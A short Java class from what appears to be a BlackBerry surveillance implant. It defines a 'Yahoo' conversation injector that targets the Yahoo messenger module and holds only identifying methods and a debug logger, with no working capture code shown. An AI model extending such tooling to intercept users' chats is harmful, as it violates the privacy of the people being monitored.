package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class YahooInjector extends AConversationInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("YahooInjector", DebugLevel.VERBOSE);
    //#endif
    
    public String getAppName() {
        return "Yahoo";
    }

    public String getCodName() {
        return "net_rim_bb_qm_yahoo";
    }



}
